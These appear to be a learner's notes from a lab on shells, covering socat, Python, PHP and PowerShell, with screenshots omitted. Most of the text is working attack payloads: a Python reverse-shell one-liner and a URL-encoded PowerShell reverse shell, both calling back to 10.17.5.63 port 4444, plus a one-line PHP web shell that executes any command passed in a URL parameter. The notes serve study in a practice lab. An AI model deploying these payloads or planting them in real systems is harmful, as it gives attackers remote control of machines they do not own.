## Socat Bind and Revshells

Socat doesnt give any prompt that the connection is established unlike netcat but we can see all the commands are working fine but the shell is unstable and non interactive

**Reverse Shell**

![[Pasted image 20220215031706.png]]

**Bind Shell**

![[Pasted image 20220215031917.png]]

## Python Revshell

python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.5.63",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

![[Pasted image 20220215032324.png]]

# Windows Box

Switch to the Windows VM. Try uploading and activating the `php-reverse-shell`. Does this work?

**No**

![[Pasted image 20220215033622.png]]

Simple Windows php-revshell 

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>

![[Pasted image 20220215034017.png]]

Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.

powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.17.5.63%27%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

![[Pasted image 20220215034755.png]]

![[Pasted image 20220215034740.png]]

